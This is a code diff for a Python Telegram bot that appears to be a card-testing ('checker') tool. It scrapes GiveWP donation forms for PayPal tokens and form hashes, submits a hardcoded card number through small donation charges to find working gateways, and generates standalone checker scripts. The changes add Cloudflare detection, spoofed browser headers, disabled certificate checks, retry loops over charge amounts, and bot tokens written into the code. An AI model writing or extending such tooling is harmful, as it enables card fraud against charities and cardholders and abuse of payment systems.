@@ -32,7 +32,7 @@ except:
         def random(self):
             return random.choice(self.agents)
 
-token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
+token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
 myid = ['6843321125']
@@ -102,20 +102,24 @@ PAYPAL_RESPONSES = [
     'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
     'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
     'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
-    'INVALID_TRANSACTION', 'SECURITY_VIOLATION',
-    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
-    'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
-    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
-    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
-    'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'PAYEE_BLOCKED_TRANSACTION',
-    'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID', 'CVV_FAILURE',
+    'INVALID_TRANSACTION', 'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER',
+    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
+    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
+    'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED',
+    'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT',
+    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'DECLINED', 'CHARGE',
+    'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR', 'AUTHENTICATION_FAILURE',
+    'NOT_AUTHORIZED', 'PAYEE_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
+    'PAYER_ACCOUNT_INVALID', 'CVV_FAILURE',
     'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'PAYEE_ACCOUNT_RESTRICTED',
     'PAYEE_ACCOUNT_LOCKED_OR_CLOSED', 'PAYEE_ACCOUNT_INVALID',
     'PAYER_BLOCKED_TRANSACTION', 'INVALID_PAYER_ID', 'INVALID_PAYEE_ID',
     'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED', 'CAPTURE_DECLINED',
     'INVALID_REQUEST', 'INVALID_PARAMETER', 'MALFORMED_REQUEST',
     'RATE_LIMIT_REACHED', 'INTERNAL_SERVER_ERROR',
+    'INVALID_CARD_NUMBER', 'INVALID_EXPIRY', 'CARD_EXPIRED',
+    'ORDER_ALREADY_CAPTURED', 'ORDER_EXPIRED', 'ORDER_NOT_FOUND',
+    'ORDER_COMPLETED', 'DUPLICATE_REQUEST', 'IDEMPOTENCY_KEY_REQUIRED',
 ]
 
 DEAD_RESPONSES = [
@@ -124,13 +128,15 @@ DEAD_RESPONSES = [
     'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
     'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
     'name', 'UserAgent', 'ImportError', 'Expecting value',
+    'Verifying that you are not a robot', 'Cloudflare', 'CF-Challenge',
+    'Just a moment', 'Checking your browser', 'Access denied',
 ]
 
 
 class PayPalLinkTester:
     def __init__(self, target_url):
-        self.first_name = ["James", "John", "Robert", "Michael", "William"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Christopher"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
         self.donation = "1.00"
         self.minimum_amount = "1.00"
         self.current_price_id = None
@@ -156,10 +162,19 @@ class PayPalLinkTester:
         self.js_sources = []
         self.price_levels = []
         self.last_attempts = []
+        self.is_cloudflare = False
+        self.has_form = False
 
     def Charge(self, ccx):
         try:
             self._init_and_extract()
+            
+            if self.is_cloudflare:
+                return "CLOUDFLARE_BLOCKED"
+            
+            if not self.has_form:
+                return "NO_FORM_FOUND"
+            
             self._try_all_token_methods()
 
             parts = ccx.strip().split("|")
@@ -232,6 +247,8 @@ class PayPalLinkTester:
                     'EXPIRED_CARD', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
                     'CVV2_FAILURE', 'CVV_FAILURE', 'DO_NOT_HONOR',
                     'GENERIC_DECLINE', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN',
+                    'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER',
+                    'INVALID_TRANSACTION', 'INVALID_ACCOUNT',
                 ]:
                     if code in confirm_str:
                         if code == 'ORDER_NOT_APPROVED':
@@ -249,72 +266,113 @@ class PayPalLinkTester:
             headers = {
                 'user-agent': self.uu.random,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9'
+                'accept-language': 'en-US,en;q=0.9',
+                'accept-encoding': 'gzip, deflate, br',
+                'connection': 'keep-alive',
+                'upgrade-insecure-requests': '1',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
             }
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=20)
             self.cookies = dict(response.cookies)
             html = response.text
+            
+            # Cloudflare check
+            html_lower = html.lower()
+            if any(x in html_lower for x in ['verifying that you are not a robot', 
+                                              'checking your browser', 
+                                              'just a moment', 
+                                              'cf-browser-verification',
+                                              'cf-challenge',
+                                              'cloudflare']):
+                self.is_cloudflare = True
+                return
+            
+            # Form check
+            if 'give-form' not in html_lower and 'give-form-hash' not in html_lower:
+                if 'give-form-id-prefix' not in html_lower:
+                    # محاولة iframe
+                    iframe_match = re.search(r'<iframe[^>]*src=["\'](https?://[^"\']*give[^"\']*)["\']', html, re.IGNORECASE)
+                    if iframe_match:
+                        iframe_url = iframe_match.group(1)
+                        r2 = self.r.get(iframe_url, headers={'user-agent': self.uu.random}, timeout=15)
+                        html = r2.text
+                        self.cookies.update(dict(r2.cookies))
+                        html_lower = html.lower()
+            
+            if 'give-form' not in html_lower and 'give-form-id' not in html_lower:
+                return  # no form
+            
+            self.has_form = True
+            
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
             self._extract_all_tokens(html)
             self._extract_minimum_amount(html)
             self._extract_price_levels(html)
+            
             m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
             if m and m.group(1).strip():
                 self.current_price_id = m.group(1).strip()
+            
             self._extract_from_js(html)
         except:
             pass
 
     def _extract_price_levels(self, html):
         levels = []
+        
+        # data-price-id + data-price
         for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', html):
             try: levels.append((m.group(1), float(m.group(2))))
             except: pass
         for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', html):
             try: levels.append((m.group(2), float(m.group(1))))
             except: pass
-        for m in re.finditer(r'data-price=["\']([\d.]+)["\']', html):
-            try: levels.append(('custom', float(m.group(1))))
-            except: pass
+        
+        # radios
         for m in re.finditer(r'<input[^>]*type="radio"[^>]*value=["\']([\d.]+)["\'][^>]*data-price-id=["\']([^"\']+)["\']', html):
             try: levels.append((m.group(2), float(m.group(1))))
             except: pass
         for m in re.finditer(r'<input[^>]*type="radio"[^>]*data-price-id=["\']([^"\']+)["\'][^>]*value=["\']([\d.]+)["\']', html):
             try: levels.append((m.group(1), float(m.group(2))))
             except: pass
-        for m in re.finditer(r'<button[^>]*>([^<]*\$[\d.,]+[^<]*)</button>', html):
+        
+        # buttons بـ $X
+        for m in re.finditer(r'<button[^>]*>\s*\$([\d.,]+)\s*</button>', html):
             try:
-                amt_match = re.search(r'\$([\d.,]+)', m.group(1))
-                if amt_match:
-                    amt = float(amt_match.group(1).replace(',', ''))
-                    levels.append(('custom', amt))
+                amt = float(m.group(1).replace(',', ''))
+                levels.append(('custom', amt))
             except: pass
+        
+        # data-amount
         for m in re.finditer(r'data-amount=["\']([\d.]+)["\']', html):
             try: levels.append(('custom', float(m.group(1))))
             except: pass
-        for m in re.finditer(r'<option[^>]*value=["\']([\d.]+)["\']', html):
-            try: levels.append(('custom', float(m.group(1))))
-            except: pass
+        
+        # data-price-id + text $X
         for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*>[^<]*\$([\d.,]+)', html):
             try:
                 amt = float(m.group(2).replace(',', ''))
                 levels.append((m.group(1), amt))
             except: pass
-        for m in re.finditer(r'<input[^>]*name="give-amount"[^>]*value=["\']([\d.]+)["\']', html):
-            try: levels.append(('custom', float(m.group(1))))
-            except: pass
+        
+        # JSON levels
         for m in re.finditer(r'"price_id"\s*:\s*"?(\d+)"?[^}]*?"amount"\s*:\s*"?([\d.]+)"?', html):
             try: levels.append((m.group(1), float(m.group(2))))
             except: pass
+        
+        # dedupe + sort
         seen = set()
         unique = []
         for pid, amt in levels:
-            key = (pid, amt)
-            if key not in seen and amt > 0:
-                seen.add(key)
-                unique.append((pid, amt))
+            if amt >= 1.0:  # تجاهل أقل من 1
+                key = (pid, amt)
+                if key not in seen:
+                    seen.add(key)
+                    unique.append((pid, amt))
         unique.sort(key=lambda x: x[1])
         self.price_levels = unique
 
@@ -352,6 +410,7 @@ class PayPalLinkTester:
                     if r2.status_code != 200 or not r2.text: continue
                     self.js_sources.append(js_url.split('/')[-1])
                     js_text = r2.text
+                    
                     if not self.client_id:
                         for p in [
                             r'client-id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
@@ -365,6 +424,7 @@ class PayPalLinkTester:
                             if mm:
                                 self.client_id = mm.group(1)
                                 break
+                    
                     if not self.access_token:
                         for p in [r'"data-client-token"\s*:\s*"([^"]+)"',
                                   r'data-client-token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
@@ -381,6 +441,7 @@ class PayPalLinkTester:
                                         self.access_token = tm.group(1)
                                         break
                                 except: pass
+                    
                     if not self.access_token:
                         for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                                   r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
@@ -389,10 +450,12 @@ class PayPalLinkTester:
                             if mm:
                                 self.access_token = mm.group(1)
                                 break
+                    
                     if not self.access_token:
                         for mm in re.finditer(r'"(A21[A-Za-z0-9+/=_-]{40,})"', js_text):
                             self.access_token = mm.group(1)
                             break
+                    
                     if not self.client_id:
                         for p in [r'merchant-id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                                   r'"merchant_id"\s*:\s*"([^"]+)"',
@@ -401,6 +464,7 @@ class PayPalLinkTester:
                             if mm:
                                 self.client_id = mm.group(1)
                                 break
+                    
                     if self.access_token and self.client_id:
                         return
                 except:
@@ -559,32 +623,58 @@ class PayPalLinkTester:
     def _create_order_smart(self):
         if not self.ajax_url:
             return self._create_order_direct()
+        
         attempts = []
-        for pid, amt in self.price_levels:
-            attempts.append((pid, amt))
+        
+        # 1. $1.00 الأول
         if self.current_price_id:
-            for amt in [1.0, 2.0, 3.0, 5.0, 10.0, 15.0, 20.0, 25.0, 50.0, 100.0]:
-                attempts.append((self.current_price_id, amt))
-        for amt in [1.0, 2.0, 3.0, 5.0, 10.0]:
-            attempts.append(('', amt))
-        for amt in [1.0, 2.0, 3.0, 5.0]:
-            attempts.append(('custom', amt))
-        for amt in [1.0, 5.0, 10.0]:
-            attempts.append(('3', amt))
-        if self.minimum_amount and self.minimum_amount != "1.00":
+            attempts.append((self.current_price_id, 1.0))
+        attempts.append(('custom', 1.0))
+        attempts.append(('', 1.0))
+        attempts.append(('3', 1.0))
+        
+        # 2. $5.00 التاني
+        if self.current_price_id:
+            attempts.append((self.current_price_id, 5.0))
+        attempts.append(('custom', 5.0))
+        attempts.append(('', 5.0))
+        attempts.append(('3', 5.0))
+        
+        # 3. levels الحقيقية
+        real_levels = []
+        for pid, amt in self.price_levels:
+            if amt in (1.0, 5.0):
+                continue
+            real_levels.append((pid, amt))
+        real_levels.sort(key=lambda x: x[1])
+        for pid, amt in real_levels:
+            attempts.append((pid, amt))
+        
+        # 4. minimum_amount
+        if self.minimum_amount and self.minimum_amount not in ("1.00", "5.00"):
             try:
-                for pid in [self.current_price_id, 'custom', '', '3']:
-                    if pid is not None:
-                        attempts.append((str(pid), float(self.minimum_amount)))
+                min_f = float(self.minimum_amount)
+                if self.current_price_id:
+                    attempts.append((self.current_price_id, min_f))
+                attempts.append(('custom', min_f))
+                attempts.append(('', min_f))
             except: pass
+        
+        # 5. مبالغ أعلى
+        for amt in [2.0, 3.0, 10.0, 15.0, 20.0, 25.0, 50.0, 100.0]:
+            if self.current_price_id:
+                attempts.append((self.current_price_id, amt))
+            attempts.append(('custom', amt))
+        
+        # dedupe بدون sort
         seen = set()
         unique = []
         for pid, amt in attempts:
-            key = (str(pid), float(amt))
+            key = (str(pid), round(float(amt), 2))
             if key not in seen:
                 seen.add(key)
                 unique.append((str(pid), float(amt)))
-        unique.sort(key=lambda x: x[1])
+        
         for pid, amt in unique:
             amount_str = f"{amt:.2f}"
             self.donation = amount_str
@@ -593,6 +683,7 @@ class PayPalLinkTester:
             if order_id:
                 return order_id
             time.sleep(0.3)
+        
         if self.access_token:
             return self._create_order_direct()
         if self.client_token:
@@ -715,6 +806,8 @@ class PayPalLinkTester:
             ('ACCOUNT_CLOSED', 'ACCOUNT_CLOSED'),
             ('LOST_OR_STOLEN', 'LOST_OR_STOLEN'),
             ('TRANSACTION_REFUSED', 'TRANSACTION_REFUSED'),
+            ('INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER', 'INVALID_TRANSACTION'),
+            ('INVALID_TRANSACTION', 'INVALID_TRANSACTION'),
             ('INVALID_ACCOUNT', 'INVALID_ACCOUNT'),
             ('AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILURE'),
             ('PAYMENT_DENIED', 'PAYMENT_DENIED'),
@@ -733,7 +826,6 @@ class PayPalLinkTester:
             ('TRANSACTION_CANNOT_BE_COMPLETED', 'TRANSACTION_CANNOT_BE_COMPLETED'),
             ('DECLINED_PLEASE_RETRY', 'DECLINED_PLEASE_RETRY'),
             ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED'),
-            ('INVALID_TRANSACTION', 'INVALID_TRANSACTION'),
             ('PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_RESTRICTED'),
             ('PAYER_ACCOUNT_INVALID', 'PAYER_ACCOUNT_INVALID'),
         ]
@@ -751,6 +843,10 @@ def check_single_link(link):
             return {'link': link, 'live': False, 'respons': 'Invalid URL'}
         paypal = PayPalLinkTester(target_url=link)
         result = paypal.Charge('4059986126444431|11|30|947')
+        
+        if result in ('CLOUDFLARE_BLOCKED', 'NO_FORM_FOUND'):
+            return {'link': link, 'live': False, 'respons': result, 'amount': None}
+        
         is_live = False
         for pr in PAYPAL_RESPONSES:
             if pr.lower() in result.lower():
@@ -798,7 +894,7 @@ def ali_al2(massege):
         if not link.startswith(("http://", "https://")):
             safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
             return
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
+        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, verify=False)
         if r.status_code != 200:
             safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
             return
@@ -808,6 +904,12 @@ def ali_al2(massege):
     try:
         paypal = PayPalLinkTester(target_url=link)
         result = paypal.Charge('4059986126444431|11|30|947')
+        
+        if result in ('CLOUDFLARE_BLOCKED', 'NO_FORM_FOUND'):
+            msg_text = "Cloudflare Protection 🛡️" if result == 'CLOUDFLARE_BLOCKED' else "No GiveWP Form Found ❌"
+            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {msg_text}")
+            return
+        
         is_live = False
         for pr in PAYPAL_RESPONSES:
             if pr.lower() in result.lower():
@@ -986,23 +1088,23 @@ Dev: @FAWZY30"""
 
 
 def generate_gateway_code(result, link, paypal_obj=None, result_dict=None):
-    id_form1 = ''; id_form2 = ''; nonec = ''; au = ''; client_id = ''; amount = '5.00'
+    id_form1 = ''; id_form2 = ''; nonec = ''; au = ''; client_id = ''; amount = '1.00'
     if paypal_obj:
         id_form1 = paypal_obj.form_data.get('give-form-id-prefix', '')
         id_form2 = paypal_obj.form_data.get('give-form-id', '')
         nonec = paypal_obj.form_data.get('give-form-hash', '')
         au = paypal_obj.client_token or paypal_obj.access_token or ''
         client_id = paypal_obj.client_id or ''
-        amount = paypal_obj.donation or paypal_obj.minimum_amount or '5.00'
+        amount = paypal_obj.donation or paypal_obj.minimum_amount or '1.00'
     elif result_dict:
         id_form1 = result_dict.get('id_form1', '')
         id_form2 = result_dict.get('id_form2', '')
         nonec = result_dict.get('nonec', '')
         au = result_dict.get('au', '')
         client_id = result_dict.get('client_id', '')
-        amount = result_dict.get('amount', '5.00')
-    if amount in ('1.00', '0', None, ''):
-        amount = '5.00'
+        amount = result_dict.get('amount', '1.00')
+    if amount in ('0', None, ''):
+        amount = '1.00'
     return f'''import requests, re, random, time, base64, uuid
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -1014,6 +1116,7 @@ class PayPal:
         self.first_name = ["James", "John", "Robert"]
         self.last_name = ["Smith", "Johnson", "Williams"]
         self.donation = "{amount}"
+        self.min_amount = "1.00"
         self.id_form1 = "{id_form1}"
         self.id_form2 = "{id_form2}"
         self.nonec = "{nonec}"
@@ -1033,22 +1136,8 @@ class PayPal:
             if "20" in yy: yy = yy.split("20")[1]
             expiry = f"20{{yy}}-{{mm}}"
 
-            da = MultipartEncoder({{
-                'give-form-id-prefix': (None, self.id_form1),
-                'give-form-id': (None, self.id_form2),
-                'give-form-hash': (None, self.nonec),
-                'give-amount': (None, self.donation),
-                'payment-mode': (None, 'paypal-commerce'),
-                'give_first': (None, random.choice(self.first_name)),
-                'give_last': (None, random.choice(self.last_name)),
-                'give_email': (None, self.email),
-                'give-gateway': (None, 'paypal-commerce'),
-            }})
-            he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
-            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_create_order'}}, headers=he, data=da, timeout=15)
-            try:
-                order_id = r3.json()['data']['id']
-            except:
+            order_id = self._create_order_with_retry()
+            if not order_id:
                 return "Create Order Failed"
 
             he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}}
@@ -1088,6 +1177,9 @@ class PayPal:
                 ('ACCOUNT_CLOSED', 'ACCOUNT_CLOSED'),
                 ('LOST_OR_STOLEN', 'LOST_OR_STOLEN'),
                 ('TRANSACTION_REFUSED', 'TRANSACTION_REFUSED'),
+                ('INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER', 'INVALID_TRANSACTION'),
+                ('INVALID_TRANSACTION', 'INVALID_TRANSACTION'),
+                ('INVALID_ACCOUNT', 'INVALID_ACCOUNT'),
             ]
             for keyword, label in codes_check:
                 if keyword.lower() in text_lower:
@@ -1100,6 +1192,43 @@ class PayPal:
                 return "DECLINED"
         except Exception as e:
             return f"Error: {{e}}"
+
+    def _create_order_with_retry(self):
+        amounts = [self.donation, "1.00", "5.00", "2.00", "3.00", "10.00", "15.00", "20.00", "25.00", "50.00"]
+        seen = set()
+        for amt in amounts:
+            if amt in seen: continue
+            seen.add(amt)
+            self.donation = amt
+            oid = self._create_order_once()
+            if oid:
+                return oid
+            time.sleep(0.3)
+        return None
+
+    def _create_order_once(self):
+        da = MultipartEncoder({{
+            'give-form-id-prefix': (None, self.id_form1),
+            'give-form-id': (None, self.id_form2),
+            'give-form-hash': (None, self.nonec),
+            'give-amount': (None, self.donation),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, random.choice(self.first_name)),
+            'give_last': (None, random.choice(self.last_name)),
+            'give_email': (None, self.email),
+            'give-gateway': (None, 'paypal-commerce'),
+        }})
+        he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
+        try:
+            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_create_order'}}, headers=he, data=da, timeout=15)
+            if r3.status_code == 200 and r3.text:
+                try:
+                    return r3.json()['data']['id']
+                except:
+                    return None
+        except:
+            return None
+        return None
 
 if __name__ == '__main__':
     print('Cheker')
@@ -1198,10 +1327,22 @@ def block_user(message):
         safe_send_message(message.chat.id, "You do not have permission.")
         return
     try:
-        user_id_to_block = message.text.split()[1]
+        user_id_to_block = message.text.split()[1].strip()
+        if not user_id_to_block.isdigit():
+            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
+            return
+        with open('blockusers.txt', 'r') as file:
+            blocked = file.read().splitlines()
+        if user_id_to_block in blocked:
+            safe_send_message(message.chat.id, f"⚠️ User ID {user_id_to_block} is already blocked.")
+            return
         with open('blockusers.txt', 'a') as file:
             file.write(f"{user_id_to_block}\n")
         safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
+        try:
+            safe_send_message(int(user_id_to_block), "🚫 You have been blocked by the admin.")
+        except:
+            pass
     except:
         safe_send_message(message.chat.id, "Usage: /block2 [user_id]")
 
@@ -1212,16 +1353,87 @@ def unblock_user(message):
         safe_send_message(message.chat.id, "You do not have permission.")
         return
     try:
-        user_id_to_unblock = message.text.split()[1]
+        user_id_to_unblock = message.text.split()[1].strip()
+        if not user_id_to_unblock.isdigit():
+            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
+            return
         with open('blockusers.txt', 'r') as file:
             lines = file.readlines()
+        found = any(line.strip() == user_id_to_unblock for line in lines)
+        if not found:
+            safe_send_message(message.chat.id, f"⚠️ User ID {user_id_to_unblock} is not blocked.")
+            return
         with open('blockusers.txt', 'w') as file:
             for line in lines:
                 if line.strip() != user_id_to_unblock:
                     file.write(line)
         safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
+        try:
+            safe_send_message(int(user_id_to_unblock), "✅ You have been unblocked by the admin.")
+        except:
+            pass
     except:
         safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")
+
+
+@bot.message_handler(commands=['blocklist'])
+def block_list(message):
+    if str(message.from_user.id) not in admins:
+        safe_send_message(message.chat.id, "You do not have permission.")
+        return
+    with open('blockusers.txt', 'r') as file:
+        blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
+    if not blocked:
+        safe_send_message(message.chat.id, "📋 Block list is empty.")
+        return
+    text = "📋 <b>Blocked Users:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
+    for i, uid in enumerate(blocked, 1):
+        text += f"{i}. <code>{uid}</code>\n"
+    text += f"━━━━━━━━━━━━━━━━━━━━\n📌 Total: <b>{len(blocked)}</b>"
+    safe_send_message(message.chat.id, text)
+
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(message):
+    if str(message.from_user.id) not in admins:
+        safe_send_message(message.chat.id, "You do not have permission.")
+        return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        safe_send_message(message.chat.id, "Usage: /broadcast [message]")
+        return
+    broadcast_text = parts[1].strip()
+    msg = safe_send_message(message.chat.id, "📤 Send the broadcast message to the owner:\n\n" + broadcast_text)
+    if not msg:
+        return
+    sent = 0
+    failed = 0
+    with open('blockusers.txt', 'r') as file:
+        blocked = file.read().splitlines()
+    with open('users.txt', 'r') as file:
+        users = [u.strip() for u in file.read().splitlines() if u.strip()]
+    for uid in users:
+        if uid in blocked:
+            continue
+        try:
+            safe_send_message(int(uid), f"📢 <b>Broadcast:</b>\n\n{broadcast_text}")
+            sent += 1
+        except:
+            failed += 1
+        time.sleep(0.05)
+    safe_send_message(message.chat.id, f"✅ Broadcast done.\n\n✔️ Sent: {sent}\n❌ Failed: {failed}")
+
+
+def save_user(user_id):
+    try:
+        with open('users.txt', 'r') as file:
+            users = file.read().splitlines()
+        if str(user_id) not in users:
+            with open('users.txt', 'a') as file:
+                file.write(f"{user_id}\n")
+    except:
+        with open('users.txt', 'w') as file:
+            file.write(f"{user_id}\n")
 
 
 print('✅ Bot is running...')
